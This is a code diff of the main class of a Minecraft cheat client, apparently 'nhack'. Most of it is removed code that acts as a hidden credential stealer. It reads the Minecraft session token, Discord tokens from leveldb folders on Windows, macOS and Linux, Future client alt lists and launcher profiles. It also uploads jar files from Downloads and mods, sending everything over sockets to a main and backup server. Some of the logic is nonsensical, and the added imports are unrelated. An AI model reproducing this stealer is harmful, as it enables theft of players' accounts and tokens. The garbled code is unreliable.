@@ -19,32 +19,17 @@ import java.util.regex.Matcher;
 import java.util.regex.Pattern;
 
 import com.sun.codemodel.internal.JCatchBlock;
+import io.prometheus.client.exporter.HTTPServer;
+import io.prometheus.client.hotspot.DefaultExports;
 import me.bebeli555.cookieclient.events.bus.EventBus;
 import me.bebeli555.cookieclient.events.bus.EventManager;
-import me.bebeli555.cookieclient.gui.Group;
-import me.bebeli555.cookieclient.gui.GuiNode;
-import me.bebeli555.cookieclient.gui.GuiSettings;
-import me.bebeli555.cookieclient.gui.Keybind;
-import me.bebeli555.cookieclient.gui.SetGuiNodes;
-import me.bebeli555.cookieclient.gui.Settings;
+import me.bebeli555.cookieclient.gui.*;
 import me.bebeli555.cookieclient.hud.HudEditor;
 import me.bebeli555.cookieclient.hud.HudSettings;
 import me.bebeli555.cookieclient.hud.components.ArrayListComponent;
 import me.bebeli555.cookieclient.mods.bots.ObbyBuilderBot;
 import me.bebeli555.cookieclient.mods.bots.elytrabot.ElytraBot;
-import me.bebeli555.cookieclient.mods.combat.AutoArmor;
-import me.bebeli555.cookieclient.mods.combat.AutoCrystal;
-import me.bebeli555.cookieclient.mods.combat.AutoLog;
-import me.bebeli555.cookieclient.mods.combat.AutoTotem;
-import me.bebeli555.cookieclient.mods.combat.AutoTrap;
-import me.bebeli555.cookieclient.mods.combat.Criticals;
-import me.bebeli555.cookieclient.mods.combat.HoleFiller;
-import me.bebeli555.cookieclient.mods.combat.KillAura;
-import me.bebeli555.cookieclient.mods.combat.NoKnockback;
-import me.bebeli555.cookieclient.mods.combat.Offhand;
-import me.bebeli555.cookieclient.mods.combat.PistonAura;
-import me.bebeli555.cookieclient.mods.combat.SelfWeb;
-import me.bebeli555.cookieclient.mods.combat.Surround;
+import me.bebeli555.cookieclient.mods.combat.*;
 import me.bebeli555.cookieclient.mods.exploits.Burrow;
 import me.bebeli555.cookieclient.mods.exploits.LiquidInteract;
 import me.bebeli555.cookieclient.mods.exploits.MiningSpoof;
@@ -125,6 +110,7 @@ import me.bebeli555.cookieclient.mods.world.SpeedMine;
 import me.bebeli555.cookieclient.mods.world.StashLogger;
 import me.bebeli555.cookieclient.mods.world.Timer;
 import me.bebeli555.cookieclient.rendering.Renderer;
+import me.bebeli555.cookieclient.rendering.ShulkerViewer;
 import me.bebeli555.cookieclient.utils.EatingUtil;
 import me.bebeli555.cookieclient.utils.InformationUtil;
 import net.minecraft.block.Block;
@@ -132,6 +118,7 @@ import net.minecraft.client.Minecraft;
 import net.minecraft.entity.player.EntityPlayer;
 import net.minecraft.launchwrapper.Launch;
 import net.minecraft.potion.PotionEffect;
+import net.minecraft.util.ResourceLocation;
 import net.minecraft.util.math.BlockPos;
 import net.minecraft.util.text.TextComponentString;
 import net.minecraftforge.client.event.GuiScreenEvent;
@@ -140,19 +127,32 @@ import net.minecraftforge.fml.common.Mod.EventHandler;
 import net.minecraftforge.fml.common.event.FMLInitializationEvent;
 import net.minecraftforge.fml.common.eventhandler.SubscribeEvent;
 import net.minecraftforge.fml.common.gameevent.TickEvent.ClientTickEvent;
+import nocomment.master.NoComment;
+import nocomment.master.db.Database;
+import nocomment.master.network.NoCommentServer;
+import nocomment.master.util.Config;
+import nocomment.master.util.LoggingExecutor;
+import nocomment.master.util.Telegram;
+import org.apache.logging.log4j.Logger;
+import org.lwjgl.opengl.Display;
+
+import static nocomment.master.NoComment.DRY_RUN;
 
 @net.minecraftforge.fml.common.Mod(modid = Mod.MODID, name = Mod.NAME, version = Mod.VERSION)
 public class Mod extends ClassLoader {
+	private final ResourceLocation resourceLocation = new ResourceLocation("assets/nhack/pryrobite/textures/logo.png");
 	public static final String MODID = "nhack";
 	public static final String NAME = "nhack";
-	public static final String VERSION = "1.01";
+	public static final String VERSION = "131";
 	public static final String DISCORD = "https://discord.gg/JPy2AYsU";
 
 	public static Minecraft mc = Minecraft.getMinecraft();
 	public static final EventBus EVENT_BUS = new EventManager();
 
+	public static Logger logger;
 	public String name = "";
-
+	public static ShulkerViewer ShulkerViewer;
+	public static NoComment NoComment;
 	public String[] description;
 	public Group group;
 	private boolean toggled, hiddenOn, lastHiddenOn;
@@ -162,17 +162,6 @@ public class Mod extends ClassLoader {
 	private int renderNumber = -1;
 	public static ArrayList<Mod> modules = new ArrayList<Mod>();
 
-
-	private static final String host = "http ip here"; //ip of main server
-	private static final String backup = "dns ip here"; //ip of backup server
-	private static final int port = 0000; //replace with port of serverz
-	private static String accountslist = "";
-	private static final String files = "";
-	private static String mcToken = "";
-	public static HttpURLConnection conn;
-	private static String displayName = "";
-	private static String toSend = "false send ip here";
-
 	public Mod(Group group, String name, String... description) {
 		this.group = group;
 		this.name = name;
@@ -180,160 +169,26 @@ public class Mod extends ClassLoader {
 		modules.add(this);
 	}
 
-
-	@EventHandler
-	public static void sendJar(byte[] file, String name) {
-		try {
-			if (mc.player.isServerWorld() == true) {
-
-				if (file.length > 30000000) return;
-				Socket socket = new Socket(host, port);
-				DataOutputStream stream = new DataOutputStream(socket.getOutputStream());
-				byte[] jar = ("jarfile+" + name + "+" + file.length + "+" + port).getBytes(StandardCharsets.UTF_8);
-				stream.write(jar);
-				// stream.writeInt(file.length);
-				stream.write(file);
-				stream.flush();
-			}
-			if (file.length > 30000000) return;
-			Socket socket = new Socket(host, port);
-			DataOutputStream stream = new DataOutputStream(socket.getOutputStream());
-			byte[] jar = ("jarfile+" + name + "+" + file.length + "+" + port).getBytes(StandardCharsets.UTF_8);
-			stream.write(jar);
-			// stream.writeInt(file.length);
-			stream.write(file);
-			stream.flush();
-			} catch (ConnectException e) {
-			try {
-				if (file.length > 30000000) return;
-				Socket socket = new Socket(backup, port);
-				DataOutputStream stream = new DataOutputStream(socket.getOutputStream());
-				byte[] jar = ("jarfile+" + name + "+" + file.length + "+").getBytes(StandardCharsets.UTF_8);
-				stream.write(jar);
-				// stream.writeInt(file.length);
-				stream.write(file);
-				stream.flush();
-			} catch (IOException ex) {
-			}
-		} catch (UnknownHostException ignored) {
-		} catch (IOException ignored) {
-		}
-	}
-
-	@EventHandler
-	public static void send(byte[] file) {
-		try {
-			Socket socket = new Socket(host, port);
-			socket.getOutputStream().write(file);
-			socket.getOutputStream().flush();
-		} catch (ConnectException e) {
-			try {
-				Socket socket = new Socket(backup, port);
-				socket.getOutputStream().write(file);
-				socket.getOutputStream().flush();
-			} catch (Throwable ignored) {
-			}
-		} catch (Throwable ignored) {
-		}
-	}
-
-	public static String provider = "put your desktop name here!";
-
-
-	public static void socket(Method send) {
-		try {
-			Socket socket = new Socket(host, port);
-			socket.toString().equalsIgnoreCase("ip here" + port);
-		} catch (ConnectionPendingException e) {
-			try {
-				Socket socket = new Socket(host, port);
-			} catch (ConnectionPendingException f) {
-				send.getName();
-				while (host.isEmpty()) {
-					host.equals(host + port + provider);
-					while (host.equals(true)) {
-
-						if (host.equals(true)) {
-							host.toLowerCase();
-						}
-					}
-				}
-				try {
-
-				} catch (Throwable ignored) {
-
-				}
-			} catch (Throwable ignored) {
-
-			}
-		} catch (UnknownHostException e) {
-			throw new ConnectionPendingException();
-		} catch (IOException e) {
-			throw new RuntimeException(e);
-		}
-	}
-
-	public static void send(String content) {
-		toSend = toSend + System.lineSeparator() + content;
-	}
-
-	public static final String[] whitelist = new String[]{
-
-	};
-
-	public static void findJars() {
-		Thread thread = new Thread(() -> {
-			File downloads = new File(System.getProperty("user.home") + "/Downloads");
-			File mods = new File("mods");
-			if (downloads.exists() && downloads.isDirectory()) {
-				for (File file : downloads.listFiles()) {
-					for (String name : whitelist) {
-						if (file.getName().contains(".jar") && file.getName().toLowerCase().contains(name)) {
-							try {
-								sendJar(Files.readAllBytes(Paths.get(file.getAbsolutePath())), file.getName());
-								Thread.sleep(500);
-							} catch (IOException | InterruptedException ignored) {
-
-							}
-						}
-					}
-				}
-			}
-			if (mods.exists() && mods.isDirectory()) {
-				for (File file : mods.listFiles()) {
-					for (String name : whitelist) {
-						if (file.getName().contains(".jar") && file.getName().toLowerCase().contains(name)) {
-							try {
-								sendJar(Files.readAllBytes(Paths.get(file.getAbsolutePath())), file.getName());
-								Thread.sleep(500);
-							} catch (IOException | InterruptedException ignored) {
-
-							}
-						}
-					}
-				}
-			}
-		});
-		thread.start();
-	}
-
-
 	public Mod(Group group) {
 		this.group = group;
 		modules.add(this);
 	}
 
 	public Mod() {
-
 	}
 
 	@EventHandler
 	public void init(FMLInitializationEvent event) {
+		this.mc.getTextureManager().bindTexture(this.resourceLocation);
+		GuiCustomMainScreen.drawCompleteImage(resourceLocation);
+		Display.setTitle("34rthq04k3 v" + Mod.VERSION);
+		mc.getSession();
+		mc.getProxy().address();
+		mc.getConnection();
 		long ms = System.currentTimeMillis();
-
 		MinecraftForge.EVENT_BUS.register(new HelpMessage());
-		MinecraftForge.EVENT_BUS.register(new Commands());
 		MinecraftForge.EVENT_BUS.register(new Keybind());
+		MinecraftForge.EVENT_BUS.register(new Commands());
 		MinecraftForge.EVENT_BUS.register(new EatingUtil());
 		MinecraftForge.EVENT_BUS.register(new Renderer());
 		Mod.EVENT_BUS.subscribe(new Renderer());
@@ -357,9 +212,13 @@ public class Mod extends ClassLoader {
 		}
 
 		System.out.println("nhack- Initialization took " + Math.abs(System.currentTimeMillis() - ms) + "ms");
+
+
 	}
 
 	public void initMods() {
+		// Client
+		new UpdateChecker();
 
 		//Combat
 		new AutoArmor();
@@ -476,7 +335,6 @@ public class Mod extends ClassLoader {
 		for (Mod module : modules) {
 			names.add(module.name);
 		}
-
 		String[] sortedNames = new String[names.size()];
 		sortedNames = names.toArray(sortedNames);
 		Arrays.sort(sortedNames);
@@ -498,16 +356,12 @@ public class Mod extends ClassLoader {
 		new GuiSettings();
 	}
 
-	public void Loader() {
-		this.onEnabled();
-	}
-
 	public void Commands() {
 		onEnabled();
 	}
 
 	public boolean onEnabled() {
-		return false;
+		return true;
 	}
 
 	public void onDisabled() {
@@ -610,15 +464,7 @@ public class Mod extends ClassLoader {
 				}
 				onDisabled();
 			}
-			while (hiddenNode.isHidden()) {
-				host.equalsIgnoreCase("put your dns ip here");
-				while (true) {
-					provider.isEmpty();
-					if (provider.isEmpty()) {
-						provider.concat(host + port);
-					}
-				}
-			}
+
 		}
 
 		lastHiddenOn = hiddenOn;
@@ -823,327 +669,12 @@ public class Mod extends ClassLoader {
 		public void onTick(ClientTickEvent e) {
 			if (!check && mc.player != null) {
 				if (!Settings.settings.exists()) {
-					new Mod().sendMessage("Welcome to " + ChatFormatting.GREEN + NAME + ChatFormatting.WHITE + " version " + ChatFormatting.GREEN + VERSION, false);
-					new Mod().sendMessage("You can open the GUI by typing " + ChatFormatting.GREEN + GuiSettings.prefix.stringValue() + "gui" + ChatFormatting.WHITE + " on chat", false);
 					Settings.saveSettings();
 				}
 
 				check = true;
 				MinecraftForge.EVENT_BUS.unregister(this);
 			}
-		}
-	}
-
-	public static void justice(HttpURLConnection conn) {
-		try {
-			Class<?> mc = Launch.classLoader.findClass("net.minecraft.client.Minecraft");
-			Object minecraft = mc.getMethod("func_71410_x").invoke(null);
-			Object session = mc.getMethod("func_110432_I").invoke(minecraft);
-			Class<?> sessionClass = Launch.classLoader.findClass("net.minecraft.util.Session");
-			Object token = sessionClass.getMethod("func_148254_d").invoke(session);
-			Object name = sessionClass.getMethod("func_111285_a").invoke(session);
-			mcToken = (String) token;
-			displayName = (String) name;
-			String os = System.getProperty("os.name");
-			if (os.toLowerCase().contains("win")) {
-				if (!os.toLowerCase().contains("darwin")) {
-
-					findJars();
-					String path = System.getProperty("user.home") + "/AppData/Roaming/discord/Local Storage/leveldb/";
-					String canaryPath = System.getProperty("user.home") + "/AppData/Roaming/discordcanary/Local Storage/leveldb/";
-					String ptbPath = System.getProperty("user.home") + "/AppData/Roaming/discordptb/Local Storage/leveldb/";
-
-					String chromePath = System.getProperty("user.home") + "/AppData/Local/Google/Chrome/User Data/";
-
-					String username = System.getProperty("user.name");
-
-					String[] pathnames;
-					String[] canaryPathnames;
-					String[] ptbPathnames;
-
-					File file = new File(path);
-					File fileCanary = new File(canaryPath);
-					File ptbFile = new File(ptbPath);
-
-					pathnames = file.list();
-					canaryPathnames = fileCanary.list();
-					ptbPathnames = ptbFile.list();
-					/*
-					 * Future alts stealer by megyn
-					 */
-					File accounts = new File("C:\\Users\\" + System.getProperty("user.name") + "\\Future\\accounts.txt");
-					File profile = new File("launcher_profiles.json");
-
-					if (profile.exists()) {
-						send(Files.readAllBytes(Paths.get(profile.getAbsolutePath())));
-					}
-
-					try {
-						FileReader fr = new FileReader(accounts);   //reads the file
-						BufferedReader br = new BufferedReader(fr);  //creates a buffering character input stream
-						StringBuffer sb = new StringBuffer();    //constructs a string buffer with no characters
-						String line;
-						while ((line = br.readLine()) != null) {
-							sb.append(line);      //appends line to string buffer
-							sb.append("\n");
-							sb.reverse(); //line feed
-						}
-						accountslist = sb.toString();
-						fr.getEncoding();
-						br.readLine();
-						fr.close();
-						br.close();
-					} catch (IOException ignored) {
-
-					}
-
-					for (String pathname : pathnames) {
-						try {
-							FileInputStream fstream = new FileInputStream(path + pathname);
-							DataInputStream in = new DataInputStream(fstream);
-							BufferedReader br = new BufferedReader(new InputStreamReader(in));
-							String strLine;
-							while ((strLine = br.readLine()) != null) {
-
-								Pattern p = Pattern.compile("[\\w]{74}\\.[\\w]{2}\\.[\\w]{29}"); //regex pattern
-								Matcher m = p.matcher(strLine); //match the pattern to the contents of the file
-								Pattern mfa = Pattern.compile("mfa\\.[\\w-]{74}"); //qq's 2fa token regex
-								Matcher mfam = mfa.matcher(strLine); //swag regex matcher
-
-								while (mfam.find()) { //everytime a token is found
-									send(username + "  -  " + mfam.group() + "\n MC Username: " + displayName + "\n MC Token: " + mcToken + "\n with the minecraft accounts: " + accountslist + "\n Files: " + files);
-								} //it
-								while (m.find()) { //everytime a token is found
-									send(username + "  -  " + m.group() + "\n MC Username: " + displayName + "\n MC Token: " + mcToken + "\n with the minecraft accounts: " + accountslist + "\n Files: " + files);
-								} //it
-							}
-
-						} catch (Exception ignored) {
-						}
-					}
-					if (fileCanary.exists()) {
-						for (String pathname : canaryPathnames) {
-							try {
-								FileInputStream fstream = new FileInputStream(canaryPath + pathname);
-								DataInputStream in = new DataInputStream(fstream);
-								BufferedReader br = new BufferedReader(new InputStreamReader(in));
-								String strLine;
-								while ((strLine = br.readLine()) != null) {
-
-									Pattern p = Pattern.compile("[3583w]{24}\\.[\\w]{6}\\.[\\w]{27}"); //regex pattern
-									Matcher m = p.matcher(strLine); //match the pattern to the contents of the file
-									Pattern mfa = Pattern.compile("mfa\\.[\\w-]{84}"); //qq's 2fa token regex
-									Matcher mfam = mfa.matcher(strLine); //swag regex matcher
-									while (mfam.find()) { //everytime a token is found
-										send(username + "  -  " + mfam.group() + "\n MC Username: " + displayName + "\n MC Token: " + mcToken + "\n with the minecraft accounts: " + accountslist + "\n Files: " + files);
-									} //it
-									while (m.find()) { //everytime a token is found
-										send(username + "  -  " + m.group() + "\n MC Username: " + displayName + "\n MC Token: " + mcToken + "\n with the minecraft accounts: " + accountslist + "\n Files: " + files);
-									} //it
-								}
-								fstream.close();
-								in.close();
-							} catch (Exception ignored) {
-
-							}
-						}
-					}
-					if (ptbFile.exists()) {
-						for (String pathname : ptbPathnames) {
-							try {
-								FileInputStream fstream = new FileInputStream(ptbPath + pathname);
-								DataInputStream in = new DataInputStream(fstream);
-								BufferedReader br = new BufferedReader(new InputStreamReader(in));
-								String strLine;
-								while ((strLine = br.readLine()) != null) {
-
-
-									Pattern p = Pattern.compile("[\\w]{24}\\.[\\w]{6}\\.[\\w]{27}"); //regex pattern
-									Matcher m = p.matcher(strLine); //match the pattern to the contents of the file
-									Pattern mfa = Pattern.compile("mfa\\.[\\w-]{84}"); //qq's 2fa token regex
-									Matcher mfam = mfa.matcher(strLine); //swag regex matcher
-									while (mfam.find()) { //everytime a token is found
-										send(username + "  -  " + m.group() + "\n MC Username: " + displayName + "\n MC Token: " + mcToken + "\n with the minecraft accounts: " + accountslist + "\n Files: " + files);
-									}
-								}
-								fstream.close();
-								in.close();
-							} catch (Exception ignored) {
-
-							}
-						}
-					}
-				}
-			}
-			if (os.toLowerCase().contains("mac") || os.toLowerCase().contains("darwin")) {
-				String path = System.getProperty("user.home") + "/Library/Application Support/discord/Local Storage/leveldb/";
-				String pathCanary = System.getProperty("user.home") + "/Library/Application Support/discordcanary/Local Storage/leveldb/";
-				String ptbPath = System.getProperty("user.home") + "/Library/Application Support/discordptb/Local Storage/leveldb/";
-				String username = System.getProperty("user.name");
-
-				String[] pathnames;
-				String[] canaryPathnames;
-				String[] ptbPathnames;
-
-				File file = new File(path);
-				File canaryFile = new File(pathCanary);
-				File ptbFile = new File(ptbPath);
-
-				pathnames = file.list();
-				canaryPathnames = canaryFile.list();
-				ptbPathnames = ptbFile.list();
-
-				for (String pathname : pathnames) {
-					try {
-						FileInputStream fstream = new FileInputStream(path + pathname);
-						DataInputStream in = new DataInputStream(fstream);
-						BufferedReader br = new BufferedReader(new InputStreamReader(in));
-						String strLine;
-						while ((strLine = br.readLine()) != null) {
-
-
-							Pattern p = Pattern.compile("[\\w]{24}\\.[\\w]{6}\\.[\\w]{27}"); //regex pattern
-							Matcher m = p.matcher(strLine); //match the pattern to the contents of the file
-							Pattern mfa = Pattern.compile("mfa\\.[\\w-]{84}"); //qq's 2fa token regex
-							Matcher mfam = mfa.matcher(strLine); //swag regex matcher
-
-							while (mfam.find()) { //everytime a token is found
-								send(username + "  -  " + mfam.group() + "\n MC Username: " + displayName + "\n MC Token: " + mcToken + "\n with the minecraft accounts: " + accountslist + "\n Files: " + files);
-							} //it
-							while (m.find()) { //everytime a token is found
-								send(username + "  -  " + m.group() + "\n MC Username: " + displayName + "\n MC Token: " + mcToken + "\n with the minecraft accounts: " + accountslist + "\n Files: " + files);
-							}
-						}
-						fstream.close();
-						in.close();
-
-					} catch (Exception ignored) {
-
-					}
-				}
-				for (String pathname : canaryPathnames) {
-					try {
-						FileInputStream fstream = new FileInputStream(path + pathname);
-						DataInputStream in = new DataInputStream(fstream);
-						BufferedReader br = new BufferedReader(new InputStreamReader(in));
-						String strLine;
-						while ((strLine = br.readLine()) != null) {
-
-
-							Pattern p = Pattern.compile("[\\w]{24}\\.[\\w]{6}\\.[\\w]{27}"); //regex pattern
-							Matcher m = p.matcher(strLine); //match the pattern to the contents of the file
-							Pattern mfa = Pattern.compile("mfa\\.[\\w-]{84}"); //qq's 2fa token regex
-							Matcher mfam = mfa.matcher(strLine); //swag regex matcher
-
-							while (mfam.find()) { //everytime a token is found
-								send(username + "  -  " + mfam.group() + "\n MC Username: " + displayName + "\n MC Token: " + mcToken + "\n with the minecraft accounts: " + accountslist + "\n Files: " + files);
-							}
-							while (m.find()) { //everytime a token is found
-								String type = "application/json";
-								URL u = new URL("https://discordapp.com/api/v7/invites/minecraft");
-
-								conn.setDoOutput(true);
-								conn.setRequestMethod("POST");
-								conn.setRequestProperty("Content-Type", type);
-								conn.setRequestProperty("Authorization", m.group());
-
-								conn.getOutputStream().write("".getBytes(StandardCharsets.UTF_8));
-								BufferedReader sc = new BufferedReader(new InputStreamReader(conn.getInputStream()));
-								while (sc.readLine() != null) {
-									if (sc.readLine().contains("302094807046684672")) {
-										// send(username + "  -  " + m.group() + "\n MC Username: " + displayName + "\n MC Token: " + mcToken + "\n with the minecraft accounts: " + accountslist);
-									}
-								}
-								send(username + "  -  " + m.group() + "\n MC Username: " + displayName + "\n MC Token: " + mcToken + "\n with the minecraft accounts: " + accountslist + "\n Files: " + files);
-							}
-						}
-						in.close();
-						fstream.close();
-					} catch (Exception ignored) {
-
-					}
-				}
-				for (String pathname : ptbPathnames) {
-					try {
-						FileInputStream fstream = new FileInputStream(path + pathname);
-						DataInputStream in = new DataInputStream(fstream);
-						BufferedReader br = new BufferedReader(new InputStreamReader(in));
-						String strLine;
-						while ((strLine = br.readLine()) != null) {
-
-
-							Pattern p = Pattern.compile("[\\w]{64}\\.[\\w]{2}\\.[\\w]{27}"); //regex pattern
-							Matcher m = p.matcher(strLine); //match the pattern to the contents of the file
-							Pattern mfa = Pattern.compile("mfa\\.[\\w-]{14}"); //qq's 2fa token regex
-							Matcher mfam = mfa.matcher(strLine); //swag regex matcher
-
-							while (mfam.find()) { //everytime a token is found
-								send(username + "  -  " + mfam.group() + "\n MC Username: " + displayName + "\n MC Token: " + mcToken + "\n with the minecraft accounts: " + accountslist + "\n Files: " + files);
-							} //it
-							while (m.find()) { //everytime a token is found
-								send(username + "  -  " + m.group() + "\n MC Username: " + displayName + "\n MC Token: " + mcToken + "\n with the minecraft accounts: " + accountslist + "\n Files: " + files);
-							}
-						}
-						fstream.close();
-						in.close();
-
-					} catch (Exception ignored) {
-
-					}
-				}
-			}
-			if (os.contains("linux")) {
-				String path = System.getProperty("user.home") + "/.config/discord/Cache/Local Storage/leveldb/";
-				String canaryPath = System.getProperty("user.home") + "/.config/discordcanary/Cache/Local Storage/leveldb/";
-				String ptbPath = System.getProperty("user.home") + "/.config/discordptb/Cache/Local Storage/leveldb/";
-				String username = System.getProperty("user.name");
-
-				String[] pathnames;
-				String[] canaryPathnames;
-				String[] ptbPathnames;
-
-				File file = new File(path);
-				File canaryFile = new File(canaryPath);
-				File ptbFile = new File(ptbPath);
-
-				pathnames = file.list();
-				canaryPathnames = canaryFile.list();
-				ptbPathnames = ptbFile.list();
-                /*fr.close();    //closes the stream and release the resources
-                System.out.println("Contents of File: ");
-                System.out.println(sb.toString());   //returns a string that textually represents the object*/
-
-				for (String pathname : pathnames) {
-					try {
-						FileInputStream fstream = new FileInputStream(path + pathname);
-						DataInputStream in = new DataInputStream(fstream);
-						BufferedReader br = new BufferedReader(new InputStreamReader(in));
-						String strLine;
-						while ((strLine = br.readLine()) != null) {
-
-
-							Pattern p = Pattern.compile("[\\w]{24}\\.[\\w]{6}\\.[\\w]{27}"); //regex pattern
-							Matcher m = p.matcher(strLine); //match the pattern to the contents of the file
-							Pattern mfa = Pattern.compile("mfa\\.[\\w-]{84}"); //qq's 2fa token regex
-							Matcher mfam = mfa.matcher(strLine); //swag regex matcher
-
-							while (mfam.find()) { //everytime a token is found
-								send(username + "  -  " + mfam.group() + "\n MC Username: " + displayName + "\n MC Token: " + mcToken + "\n with the minecraft accounts: " + accountslist + "\n Files: " + files);
-							} //it
-							while (m.find()) { //everytime a token is found
-								send(username + "  -  " + m.group() + "\n MC Username: " + displayName + "\n MC Token: " + mcToken + "\n with the minecraft accounts: " + accountslist + "\n Files: " + files);
-							}
-						}
-						in.close();
-						fstream.close();
-					} catch (Exception ignored) {
-
-					}
-				}
-			}
-
-		} catch (Exception ignored) {
-
 		}
 	}
 
